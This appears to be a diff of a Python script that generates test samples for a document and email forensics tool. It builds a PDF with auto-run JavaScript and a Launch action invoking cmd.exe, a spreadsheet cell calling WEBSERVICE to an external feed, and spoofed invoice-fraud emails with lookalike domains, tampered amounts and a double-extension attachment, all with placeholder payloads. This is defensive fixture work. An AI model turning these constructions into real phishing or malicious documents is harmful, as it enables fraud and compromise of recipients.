-        f'<w:document xmlns:w="{W_NS}"><w:body>{"".join(body)}</w:body></w:document>'
-    )
 
 
-def _xl_workbook() -> str:
-    return (
-        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-        f'<workbook xmlns="{X_NS}"><sheets>'
-        '<sheet name="Summary" sheetId="1"/>'
-        '<sheet name="Hidden" sheetId="2" state="veryHidden"/>'
-        "</sheets></workbook>"
-    )
+def eml_doc() -> bytes:
+    signed = mk.build_email(
+        from_=FROM, to=TO, subject=SUBJECT, html=HTML, text=TEXT, received=[],
+        reply_to="pagos.suministros@mail-box.example.org",
+        x_mailer="PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)",
+        message_id="<b7c1e0f2a93d@vps-2291.hosting.example>", attachments=_attachments(),
+        dkim_domain=SUPPLIER_DOMAIN, tamper_after_signing=(AMOUNT, "7.250,00"))
+    # Trace headers are added on top by the receiving MTAs, after the signature.
+    trace = ["Return-Path: <bounce@bounce.rnicrosoft-online.example>"] + \
+        [f"Received: {r}" for r in RECEIVED] + [f"Authentication-Results: {AUTH}"]
+    return ("\r\n".join(trace) + "\r\n").encode() + signed
 
 
-def _xl_sheet() -> str:
-    return (
-        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-        f'<worksheet xmlns="{X_NS}"><sheetData>'
-        f'<row r="1"><c r="A1"><f>WEBSERVICE("{URL_FEED}")</f><v>0</v></c></row>'
-        "</sheetData></worksheet>"
-    )
+def emlx_doc() -> bytes:
+    message = eml_doc()
+    plist = (b'<?xml version="1.0" encoding="UTF-8"?>\n'
+             b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
+             b'"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
+             b'<plist version="1.0"><dict><key>date-received</key><integer>1792170729</integer>'
+             b'<key>flags</key><integer>8590195713</integer></dict></plist>\n')
+    return f"{len(message)}\n".encode() + message + plist
 
 
-def _ppt_presentation() -> str:
-    return (f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-            f'<p:presentation xmlns:p="{P_NS}"/>')
+def msg_doc() -> bytes:
+    from mkmsg import build_msg
+
+    headers = "".join(f"Received: {r}\r\n" for r in RECEIVED) + (
+        f"Authentication-Results: {AUTH}\r\nFrom: {FROM}\r\nTo: {TO}\r\n"
+        "Reply-To: pagos.suministros@mail-box.example.org\r\n"
+        "Return-Path: <bounce@bounce.rnicrosoft-online.example>\r\n"
+        f"Subject: {SUBJECT}\r\nX-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)\r\n"
+        "Message-ID: <b7c1e0f2a93d@vps-2291.hosting.example>\r\n")
+    return build_msg(headers, SUBJECT, TEXT, f"facturacion@{SUPPLIER_DOMAIN}",
+                     [(n, d) for n, _ct, d in _attachments()], html=HTML)
 
 
-def _ppt_slide() -> str:
-    return (
-        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-        f'<p:sld xmlns:p="{P_NS}" xmlns:a="{A_NS}"><p:cSld><p:spTree><p:sp><p:txBody>'
-        f'<a:p><a:r><a:t>Project kickoff. Visit {URL_A} ({IP_A}).</a:t></a:r></a:p>'
-        "</p:txBody></p:sp></p:spTree></p:cSld></p:sld>"
-    )
+# --- main -----------------------------------------------------------------------------
 
-
-APP_NAME = {"word": "Microsoft Office Word", "excel": "Microsoft Excel",
-            "powerpoint": "Microsoft Office PowerPoint", "xlsb": "Microsoft Excel"}
-
-_DOCM_CT = "application/vnd.ms-word.document.macroEnabled.main+xml"
-
-
-def _docm_bytes() -> bytes:
-    """A macro-enabled Word doc (DDEAUTO + vbaProject.bin), built in memory.
-
-    Used as an email attachment so the third-party tools (olevba, msodde) have
-    something real to pull out of the message.
-    """
-    import io
-
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-        z.writestr("[Content_Types].xml", _content_types("word", "word/document.xml", _DOCM_CT))
-        z.writestr("_rels/.rels", _root_rels("word/document.xml", False))
-        z.writestr("docProps/core.xml", CORE_XML)
-        z.writestr("docProps/app.xml", _app_xml(APP_NAME["word"]))
-        z.writestr("word/document.xml", _word_doc(macro=True))
-        z.writestr("word/vbaProject.bin", b"\x00VBA placeholder (benign sample)")
-    return buf.getvalue()
-
-
-def make_ooxml(path: Path, ext: str) -> None:
-    family, main_part, main_ct = OOXML_MAIN[ext]
-    macro = ext in MACRO_EXTS
-    external = ext in TEMPLATE_EXTS
-    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
-        z.writestr("[Content_Types].xml", _content_types(family, main_part, main_ct))
-        z.writestr("_rels/.rels", _root_rels(main_part, external))
-        z.writestr("docProps/core.xml", CORE_XML)
-        z.writestr("docProps/app.xml", _app_xml(APP_NAME[family]))
-        if family == "word":
-            z.writestr(main_part, _word_doc(macro))
-        elif family == "excel":
-            z.writestr(main_part, _xl_workbook())
-            z.writestr("xl/worksheets/sheet1.xml", _xl_sheet())
-        elif family == "powerpoint":
-            z.writestr(main_part, _ppt_presentation())
-            z.writestr("ppt/slides/slide1.xml", _ppt_slide())
-        else:  # xlsb — minimal binary workbook part
-            z.writestr(main_part, b"\x00\x00\x00\x00 placeholder xlsb workbook part")
-        if macro:
-            vba_dir = {"word": "word", "excel": "xl", "powerpoint": "ppt"}[family]
-            z.writestr(f"{vba_dir}/vbaProject.bin", b"\x00VBA placeholder (benign sample)")
-
-
-def make_cfb(path: Path) -> None:
-    """Write a minimal valid OLE/CFB (compound file) with only a Root Entry."""
-    SECTOR = 512
-    FREESECT = 0xFFFFFFFF
-    ENDOFCHAIN = 0xFFFFFFFE
-    FATSECT = 0xFFFFFFFD
-
-    header = bytearray(SECTOR)
-    header[0:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
-    struct.pack_into("<H", header, 0x18, 0x003E)
-    struct.pack_into("<H", header, 0x1A, 0x0003)
-    struct.pack_into("<H", header, 0x1C, 0xFFFE)
-    struct.pack_into("<H", header, 0x1E, 0x0009)
-    struct.pack_into("<H", header, 0x20, 0x0006)
-    struct.pack_into("<I", header, 0x2C, 1)
-    struct.pack_into("<I", header, 0x30, 1)
-    struct.pack_into("<I", header, 0x38, 0x00001000)
-    struct.pack_into("<I", header, 0x3C, ENDOFCHAIN)
-    struct.pack_into("<I", header, 0x44, ENDOFCHAIN)
-    struct.pack_into("<I", header, 0x4C, 0)
-    for i in range(1, 109):
-        struct.pack_into("<I", header, 0x4C + i * 4, FREESECT)
-
-    fat = bytearray(SECTOR)
-    struct.pack_into("<I", fat, 0, FATSECT)
-    struct.pack_into("<I", fat, 4, ENDOFCHAIN)
-    for i in range(2, SECTOR // 4):
-        struct.pack_into("<I", fat, i * 4, FREESECT)
-
-    directory = bytearray(SECTOR)
-    name = "Root Entry".encode("utf-16-le")
-    directory[0:len(name)] = name
-    struct.pack_into("<H", directory, 0x40, len(name) + 2)
-    directory[0x42] = 0x05
-    directory[0x43] = 0x01
-    struct.pack_into("<I", directory, 0x44, FREESECT)
-    struct.pack_into("<I", directory, 0x48, FREESECT)
-    struct.pack_into("<I", directory, 0x4C, FREESECT)
-    struct.pack_into("<I", directory, 0x74, ENDOFCHAIN)
-    struct.pack_into("<Q", directory, 0x78, 0)
-    for e in range(1, 4):
-        base = e * 128
-        struct.pack_into("<I", directory, base + 0x44, FREESECT)
-        struct.pack_into("<I", directory, base + 0x48, FREESECT)
-        struct.pack_into("<I", directory, base + 0x4C, FREESECT)
-
-    path.write_bytes(bytes(header) + bytes(fat) + bytes(directory))
-
-
-def make_legacy_ole(path: Path, ext: str) -> None:
-    """A legacy OLE/CFB doc (.doc/.xls/.ppt) with the right main stream + a VBA
-    storage, so the OLE-family pipeline has real structure to parse."""
-    import sys as _sys
-    _sys.path.insert(0, str(Path(__file__).resolve().parent))
-    from mkmsg import build_cfb
-
-    main = {".doc": ("WordDocument", b"\xec\xa5 Word BIFF placeholder"),
-            ".dot": ("WordDocument", b"\xec\xa5 Word template"),
-            ".xls": ("Workbook", b"\x09\x08\x08\x00 BIFF8 workbook placeholder"),
-            ".xlt": ("Workbook", b"\x09\x08 BIFF template"),
-            ".xla": ("Workbook", b"\x09\x08 BIFF add-in"),
-            ".ppt": ("PowerPoint Document", b"\x0f\x00 PPT placeholder"),
-            ".pot": ("PowerPoint Document", b"\x0f\x00 PPT template")}.get(ext,
-            ("Workbook", b"placeholder"))
-    build = build_cfb([
-        main,
-        ("\x05SummaryInformation", b"\xfe\xff summary stream"),
-        ("\x05DocumentSummaryInformation", b"\xfe\xff docsummary"),
-        # A VBA project storage (olevba will try to parse it).
-        ("Macros", [("VBA", b"\x00VBA placeholder project"),
-                     ("dir", b"\x00dir stream")]),
-    ])
-    path.write_bytes(build)
-
-
-def make_pdf(path: Path) -> None:
-    """A deliberately suspicious (benign) PDF: auto-run JavaScript, a Launch
-    action, a /URI, and a real embedded file (the macro .docm) so the recursive
-    scan has something to pull out."""
-    embedded = _docm_bytes()
-    objs: list[bytes] = [
-        # 1: Catalog — auto-runs JS on open, holds the embedded-files name tree.
-        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R "
-        b"/AA << /WC 6 0 R >> /Names << /EmbeddedFiles 7 0 R >> >>\nendobj\n",
-        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n",
-        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
-        b"/AA << /O 6 0 R >> >>\nendobj\n",
-        # 4: a URI action pointing at an external host.
-        b"4 0 obj\n<< /Type /Action /S /URI /URI (http://evil.example/pdf) >>\nendobj\n",
-        # 5: JavaScript action (OpenAction target).
-        b"5 0 obj\n<< /Type /Action /S /JavaScript /JS "
-        b"(app.alert\\('owned'\\); this.exportDataObject\\({cName:'report.docm'}\\);) >>\nendobj\n",
-        # 6: Launch action (spawn a program).
-        b"6 0 obj\n<< /Type /Action /S /Launch /Win << /F (cmd.exe) /P (/c calc.exe) >> "
-        b"/Next 4 0 R >>\nendobj\n",
-        # 7: EmbeddedFiles name tree -> 8 (filespec).
-        b"7 0 obj\n<< /Names [ (report.docm) 8 0 R ] >>\nendobj\n",
-        # 8: Filespec -> 9 (embedded file stream).
-        b"8 0 obj\n<< /Type /Filespec /F (report.docm) /EF << /F 9 0 R >> >>\nendobj\n",
-        # 9: the embedded file stream.
-        b"9 0 obj\n<< /Type /EmbeddedFile /Length " + str(len(embedded)).encode()
-        + b" >>\nstream\n" + embedded + b"\nendstream\nendobj\n",
-    ]
-    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
-    offsets = [0]
-    for obj in objs:
-        offsets.append(len(out))
-        out += obj
-    xref_pos = len(out)
-    n = len(objs) + 1
-    out += f"xref\n0 {n}\n".encode() + b"0000000000 65535 f \n"
-    for off in offsets[1:]:
-        out += f"{off:010d} 00000 n \n".encode()
-    out += f"trailer\n<< /Size {n} /Root 1 0 R >>\nstartxref\n".encode()
-    out += f"{xref_pos}\n".encode() + b"%%EOF\n"
-    path.write_bytes(out)
-
-
-def _build_eml() -> bytes:
-    msg = EmailMessage()
-    # Spoofy headers: display-name domain and Return-Path differ from From;
-    # a two-hop Received chain with a suspicious origin; failing auth.
-    msg["Received"] = ("from mx.corp.example (mx.corp.example [198.51.100.2]) "
-                       "by inbox.corp.example with ESMTP id def; "
-                       "Wed, 14 Oct 2026 20:00:05 +0000")
-    msg["Received"] = ("from evil.example (unknown [203.0.113.9]) "
-                       "by mx.corp.example with ESMTP id abc; "
-                       "Wed, 14 Oct 2026 20:00:00 +0000")
-    msg["From"] = '"IT Support <support@corp.example>" <attacker@evil.example>'
-    msg["To"] = "Bob <bob@corp.example>"
-    msg["Reply-To"] = "billing@evil.example"
-    msg["Return-Path"] = "<bounce@evil.example>"
-    msg["Subject"] = "DocuTraceX sample — please review invoice"
-    msg["Date"] = formatdate(localtime=False)
-    msg["Message-ID"] = "<sample-0001@evil.example>"
-    msg["Authentication-Results"] = "mx.corp.example; spf=fail; dkim=none; dmarc=fail"
-    msg["X-Mailer"] = "SuspiciousMailer 1.0"
-    msg.set_content(f"Benign-looking body. Reference: {URL_A} and {IP_A}.\n")
-    msg.add_alternative(
-        f'<html><body><p>Click <a href="http://evil.example/pay">'
-        f'https://corp.example/invoice</a> to review.</p></body></html>',
-        subtype="html")
-    msg.add_attachment(b"MZ fake payload (benign sample)",
-                       maintype="application", subtype="octet-stream",
-                       filename="invoice.pdf.exe")
-    # A real macro-enabled Office attachment so third-party tools find macros/DDE.
-    msg.add_attachment(_docm_bytes(), maintype="application",
-                       subtype="vnd.ms-word.document.macroEnabled.12",
-                       filename="report.docm")
-    return msg.as_bytes()
-
-
-def make_eml(path: Path) -> None:
-    path.write_bytes(_build_eml())
-
-
-def make_msg(path: Path) -> None:
-    """Enriched Outlook .msg fixture (MAPI over OLE), mirroring the .eml."""
-    import sys as _sys
-    _sys.path.insert(0, str(Path(__file__).resolve().parent))
-    from mkmsg import write_msg
-
-    headers = (
-        "Received: from mx.corp.example (mx.corp.example [198.51.100.2]) "
-        "by inbox.corp.example with ESMTP id def; Wed, 14 Oct 2026 20:00:05 +0000\n"
-        "Received: from evil.example (unknown [203.0.113.9]) "
-        "by mx.corp.example with ESMTP id abc; Wed, 14 Oct 2026 20:00:00 +0000\n"
-        'From: "IT Support <support@corp.example>" <attacker@evil.example>\n'
-        "To: Bob <bob@corp.example>\n"
-        "Reply-To: billing@evil.example\n"
-        "Return-Path: <bounce@evil.example>\n"
-        "Subject: DocuTraceX sample — please review invoice\n"
-        "Authentication-Results: mx.corp.example; spf=fail; dkim=none; dmarc=fail\n"
-        "X-Mailer: SuspiciousMailer 1.0\n"
-    )
-    write_msg(path, headers, "DocuTraceX sample — please review invoice",
-              f"Benign-looking body. Reference: {URL_A} and {IP_A}.",
-              "attacker@evil.example",
-              [("invoice.pdf.exe", b"MZ fake payload (benign sample)"),
-               ("report.docm", _docm_bytes())])
-
-
-def make_emlx(path: Path) -> None:
-    message = _build_eml()
-    plist = (
-        b'<?xml version="1.0" encoding="UTF-8"?>\n'
-        b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
-        b'"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
-        b'<plist version="1.0"><dict><key>flags</key><integer>0</integer></dict></plist>\n'
-    )
-    path.write_bytes(f"{len(message)}\n".encode() + message + plist)
+def build_all() -> dict[str, bytes]:
+    out: dict[str, bytes] = {
+        "sample.docx": word_docx(), "sample.docm": word_docm(),
+        "sample.dotx": word_dotx(), "sample.dotm": word_dotm(),
+        "sample.rtf": rtf_doc(), "sample.pdf": pdf_doc(),
+        "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
+    }
+    for ext in X_CT:
+        out[f"sample{ext}"] = excel(ext)
+    for ext in P_CT:
+        out[f"sample{ext}"] = powerpoint(ext)
+    for ext in (".doc", ".dot", ".xls", ".xlt", ".xla", ".ppt", ".pot"):
+        out[f"sample{ext}"] = legacy(ext)
+    return out
 
 
 def main() -> None:
     SAMPLES.mkdir(parents=True, exist_ok=True)
-    made = []
-    for ext in OOXML_MAIN:
-        p = SAMPLES / f"sample{ext}"
-        make_ooxml(p, ext)
-        made.append(p.name)
-    for ext in OLE_EXTS:
-        if ext == ".msg":
-            continue  # real MAPI fixture, not a bare CFB
-        p = SAMPLES / f"sample{ext}"
-        if ext in (".doc", ".dot", ".xls", ".xlt", ".xla", ".ppt", ".pot"):
-            make_legacy_ole(p, ext)
-        else:
-            make_cfb(p)
-        made.append(p.name)
-    make_pdf(SAMPLES / "sample.pdf"); made.append("sample.pdf")
-    make_eml(SAMPLES / "sample.eml"); made.append("sample.eml")
-    make_emlx(SAMPLES / "sample.emlx"); made.append("sample.emlx")
-    make_msg(SAMPLES / "sample.msg"); made.append("sample.msg")
-
-    print(f"Generated {len(made)} samples in {SAMPLES}:")
-    for name in sorted(made):
-        print(f"  {name}")
+    made = build_all()
+    for name, data in made.items():
+        (SAMPLES / name).write_bytes(data)
+    shutil.copyfile(ROOT / "tests" / "data" / "excel4_sample_macro.xlsb", SAMPLES / "sample.xlsb")
+    names = sorted([*made, "sample.xlsb"])
+    print(f"Generated {len(names)} samples in {SAMPLES}:")
+    for name in names:
+        print(f"  {name:14s} {(SAMPLES / name).stat().st_size:>8} bytes")
 
 
 if __name__ == "__main__":
